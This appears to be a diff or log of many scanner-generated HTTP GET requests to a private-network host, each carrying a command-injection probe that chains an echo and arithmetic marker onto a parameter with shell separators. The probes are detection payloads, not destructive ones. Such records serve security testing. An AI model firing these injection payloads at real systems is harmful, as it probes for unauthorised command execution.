+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo QOAPUD$((95+46))$(echo QOAPUD)QOAPUD"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo QOAPUD$((95+46))$(echo QOAPUD)QOAPUD"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo IGOWAB$((43+20))$(echo IGOWAB)IGOWAB"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo IGOWAB$((43+20))$(echo IGOWAB)IGOWAB"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo IGOWAB$((43+20))$(echo IGOWAB)IGOWAB"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo IGOWAB$((43+20))$(echo IGOWAB)IGOWAB"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo HHJMGT$((14+37))$(echo HHJMGT)HHJMGT"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo HHJMGT$((14+37))$(echo HHJMGT)HHJMGT"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo HHJMGT$((14+37))$(echo HHJMGT)HHJMGT"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo HHJMGT$((14+37))$(echo HHJMGT)HHJMGT"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho LTDETU$((21+96))$(echo LTDETU)LTDETU"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho LTDETU$((21+96))$(echo LTDETU)LTDETU"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho LTDETU$((21+96))$(echo LTDETU)LTDETU"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho LTDETU$((21+96))$(echo LTDETU)LTDETU"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho PSHGIH$((74+14))$(echo PSHGIH)PSHGIH"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho PSHGIH$((74+14))$(echo PSHGIH)PSHGIH"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho PSHGIH$((74+14))$(echo PSHGIH)PSHGIH"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho PSHGIH$((74+14))$(echo PSHGIH)PSHGIH"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo FRZZOQ$((34+74))$(echo FRZZOQ)FRZZOQ&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo FRZZOQ$((34+74))$(echo FRZZOQ)FRZZOQ&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo FRZZOQ$((34+74))$(echo FRZZOQ)FRZZOQ&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo FRZZOQ$((34+74))$(echo FRZZOQ)FRZZOQ&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo OVPGBX$((5+6))$(echo OVPGBX)OVPGBX&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo OVPGBX$((5+6))$(echo OVPGBX)OVPGBX&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo OVPGBX$((5+6))$(echo OVPGBX)OVPGBX&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo OVPGBX$((5+6))$(echo OVPGBX)OVPGBX&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo YQKYNP$((66+52))$(echo YQKYNP)YQKYNP&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo YQKYNP$((66+52))$(echo YQKYNP)YQKYNP&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo YQKYNP$((66+52))$(echo YQKYNP)YQKYNP&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo YQKYNP$((66+52))$(echo YQKYNP)YQKYNP&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo TAMSOU$((26+59))$(echo TAMSOU)TAMSOU&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo TAMSOU$((26+59))$(echo TAMSOU)TAMSOU&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo TAMSOU$((26+59))$(echo TAMSOU)TAMSOU&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo TAMSOU$((26+59))$(echo TAMSOU)TAMSOU&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo TBSFDU$((12+93))$(echo TBSFDU)TBSFDU&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo TBSFDU$((12+93))$(echo TBSFDU)TBSFDU&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo TBSFDU$((12+93))$(echo TBSFDU)TBSFDU&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo TBSFDU$((12+93))$(echo TBSFDU)TBSFDU&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo IXHBRN$((47+11))$(echo IXHBRN)IXHBRN&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo HODMEV$((49+65))$(echo HODMEV)HODMEV&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo HODMEV$((49+65))$(echo HODMEV)HODMEV&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo HODMEV$((49+65))$(echo HODMEV)HODMEV&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo HODMEV$((49+65))$(echo HODMEV)HODMEV&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo LFFYRM$((83+53))$(echo LFFYRM)LFFYRM&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo LFFYRM$((83+53))$(echo LFFYRM)LFFYRM&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo LFFYRM$((83+53))$(echo LFFYRM)LFFYRM&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo LFFYRM$((83+53))$(echo LFFYRM)LFFYRM&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo ZYWUJK$((57+30))$(echo ZYWUJK)ZYWUJK&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo ZYWUJK$((57+30))$(echo ZYWUJK)ZYWUJK&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo ZYWUJK$((57+30))$(echo ZYWUJK)ZYWUJK&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo ZYWUJK$((57+30))$(echo ZYWUJK)ZYWUJK&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo YYSGLE$((88+15))$(echo YYSGLE)YYSGLE&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo YYSGLE$((88+15))$(echo YYSGLE)YYSGLE&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo YYSGLE$((88+15))$(echo YYSGLE)YYSGLE&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo YYSGLE$((88+15))$(echo YYSGLE)YYSGLE&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo KXKXLS$((69+29))$(echo KXKXLS)KXKXLS&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo KXKXLS$((69+29))$(echo KXKXLS)KXKXLS&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo KXKXLS$((69+29))$(echo KXKXLS)KXKXLS&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo KXKXLS$((69+29))$(echo KXKXLS)KXKXLS&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo QILPXE$((67+49))$(echo QILPXE)QILPXE&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo QILPXE$((67+49))$(echo QILPXE)QILPXE&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo QILPXE$((67+49))$(echo QILPXE)QILPXE&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo QILPXE$((67+49))$(echo QILPXE)QILPXE&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho THSMEW$((14+53))$(echo THSMEW)THSMEW&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho THSMEW$((14+53))$(echo THSMEW)THSMEW&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho THSMEW$((14+53))$(echo THSMEW)THSMEW&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho THSMEW$((14+53))$(echo THSMEW)THSMEW&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho HVQQMP$((26+54))$(echo HVQQMP)HVQQMP&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho HVQQMP$((26+54))$(echo HVQQMP)HVQQMP&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho HVQQMP$((26+54))$(echo HVQQMP)HVQQMP&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho HVQQMP$((26+54))$(echo HVQQMP)HVQQMP&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo JDEYGH$((93+50))$(echo JDEYGH)JDEYGH&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo JDEYGH$((93+50))$(echo JDEYGH)JDEYGH&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo JDEYGH$((93+50))$(echo JDEYGH)JDEYGH&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo JDEYGH$((93+50))$(echo JDEYGH)JDEYGH&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo RPIRQE$((42+47))$(echo RPIRQE)RPIRQE&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo RPIRQE$((42+47))$(echo RPIRQE)RPIRQE&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo RPIRQE$((42+47))$(echo RPIRQE)RPIRQE&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo RPIRQE$((42+47))$(echo RPIRQE)RPIRQE&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo YYABAN$((48+17))$(echo YYABAN)YYABAN&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo YYABAN$((48+17))$(echo YYABAN)YYABAN&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo YYABAN$((48+17))$(echo YYABAN)YYABAN&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo YYABAN$((48+17))$(echo YYABAN)YYABAN&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo JADSSZ$((22+95))$(echo JADSSZ)JADSSZ&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo JADSSZ$((22+95))$(echo JADSSZ)JADSSZ&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo JADSSZ$((22+95))$(echo JADSSZ)JADSSZ&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo JADSSZ$((22+95))$(echo JADSSZ)JADSSZ&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo FRGAFC$((41+28))$(echo FRGAFC)FRGAFC&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo FRGAFC$((41+28))$(echo FRGAFC)FRGAFC&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo FRGAFC$((41+28))$(echo FRGAFC)FRGAFC&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo FRGAFC$((41+28))$(echo FRGAFC)FRGAFC&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo ZAQWJX$((20+71))$(echo ZAQWJX)ZAQWJX&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo ZAQWJX$((20+71))$(echo ZAQWJX)ZAQWJX&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo ZAQWJX$((20+71))$(echo ZAQWJX)ZAQWJX&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo ZAQWJX$((20+71))$(echo ZAQWJX)ZAQWJX&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo OHGVKV$((71+13))$(echo OHGVKV)OHGVKV&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo OHGVKV$((71+13))$(echo OHGVKV)OHGVKV&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo OHGVKV$((71+13))$(echo OHGVKV)OHGVKV&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo OHGVKV$((71+13))$(echo OHGVKV)OHGVKV&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo TCKBLR$((71+45))$(echo TCKBLR)TCKBLR&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo TCKBLR$((71+45))$(echo TCKBLR)TCKBLR&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo TCKBLR$((71+45))$(echo TCKBLR)TCKBLR&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo TCKBLR$((71+45))$(echo TCKBLR)TCKBLR&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo PRGRRI$((81+78))$(echo PRGRRI)PRGRRI&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo PRGRRI$((81+78))$(echo PRGRRI)PRGRRI&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo PRGRRI$((81+78))$(echo PRGRRI)PRGRRI&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo PRGRRI$((81+78))$(echo PRGRRI)PRGRRI&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo XRSELS$((63+92))$(echo XRSELS)XRSELS&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo XRSELS$((63+92))$(echo XRSELS)XRSELS&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo XRSELS$((63+92))$(echo XRSELS)XRSELS&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo XRSELS$((63+92))$(echo XRSELS)XRSELS&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo AXYMMJ$((72+85))$(echo AXYMMJ)AXYMMJ&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo AXYMMJ$((72+85))$(echo AXYMMJ)AXYMMJ&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo AXYMMJ$((72+85))$(echo AXYMMJ)AXYMMJ&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo AXYMMJ$((72+85))$(echo AXYMMJ)AXYMMJ&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo PGNZBY$((13+12))$(echo PGNZBY)PGNZBY&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo PGNZBY$((13+12))$(echo PGNZBY)PGNZBY&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo PGNZBY$((13+12))$(echo PGNZBY)PGNZBY&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo PGNZBY$((13+12))$(echo PGNZBY)PGNZBY&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho JLAXZH$((48+85))$(echo JLAXZH)JLAXZH&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho JLAXZH$((48+85))$(echo JLAXZH)JLAXZH&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho JLAXZH$((48+85))$(echo JLAXZH)JLAXZH&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho JLAXZH$((48+85))$(echo JLAXZH)JLAXZH&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho AVBUIF$((34+35))$(echo AVBUIF)AVBUIF&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho AVBUIF$((34+35))$(echo AVBUIF)AVBUIF&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho AVBUIF$((34+35))$(echo AVBUIF)AVBUIF&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho AVBUIF$((34+35))$(echo AVBUIF)AVBUIF&&				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo BBMXXV$((41+98))$(echo BBMXXV)BBMXXV|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo BBMXXV$((41+98))$(echo BBMXXV)BBMXXV|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo BBMXXV$((41+98))$(echo BBMXXV)BBMXXV|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo BBMXXV$((41+98))$(echo BBMXXV)BBMXXV|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo NAGMPN$((46+73))$(echo NAGMPN)NAGMPN|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo NAGMPN$((46+73))$(echo NAGMPN)NAGMPN|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo NAGMPN$((46+73))$(echo NAGMPN)NAGMPN|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo NAGMPN$((46+73))$(echo NAGMPN)NAGMPN|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo GKJUWO$((97+83))$(echo GKJUWO)GKJUWO|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo GKJUWO$((97+83))$(echo GKJUWO)GKJUWO|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo GKJUWO$((97+83))$(echo GKJUWO)GKJUWO|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo GKJUWO$((97+83))$(echo GKJUWO)GKJUWO|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo SVCQMQ$((68+26))$(echo SVCQMQ)SVCQMQ|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo SVCQMQ$((68+26))$(echo SVCQMQ)SVCQMQ|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo SVCQMQ$((68+26))$(echo SVCQMQ)SVCQMQ|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo SVCQMQ$((68+26))$(echo SVCQMQ)SVCQMQ|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo IBPHDQ$((61+30))$(echo IBPHDQ)IBPHDQ|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo IBPHDQ$((61+30))$(echo IBPHDQ)IBPHDQ|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo IBPHDQ$((61+30))$(echo IBPHDQ)IBPHDQ|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo IBPHDQ$((61+30))$(echo IBPHDQ)IBPHDQ|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo DVMMIK$((59+30))$(echo DVMMIK)DVMMIK|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo DVMMIK$((59+30))$(echo DVMMIK)DVMMIK|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo DVMMIK$((59+30))$(echo DVMMIK)DVMMIK|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo DVMMIK$((59+30))$(echo DVMMIK)DVMMIK|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo OCYMWQ$((66+8))$(echo OCYMWQ)OCYMWQ|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo OCYMWQ$((66+8))$(echo OCYMWQ)OCYMWQ|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo OCYMWQ$((66+8))$(echo OCYMWQ)OCYMWQ|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo OCYMWQ$((66+8))$(echo OCYMWQ)OCYMWQ|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo VKBAHS$((84+92))$(echo VKBAHS)VKBAHS|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo VKBAHS$((84+92))$(echo VKBAHS)VKBAHS|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo VKBAHS$((84+92))$(echo VKBAHS)VKBAHS|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo VKBAHS$((84+92))$(echo VKBAHS)VKBAHS|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo MVRVHN$((40+29))$(echo MVRVHN)MVRVHN|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo MVRVHN$((40+29))$(echo MVRVHN)MVRVHN|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo MVRVHN$((40+29))$(echo MVRVHN)MVRVHN|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo MVRVHN$((40+29))$(echo MVRVHN)MVRVHN|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo FBBVQJ$((43+54))$(echo FBBVQJ)FBBVQJ|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo FBBVQJ$((43+54))$(echo FBBVQJ)FBBVQJ|				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo FBBVQJ$((43+54))$(echo FBBVQJ)FBBVQJ|				/web/
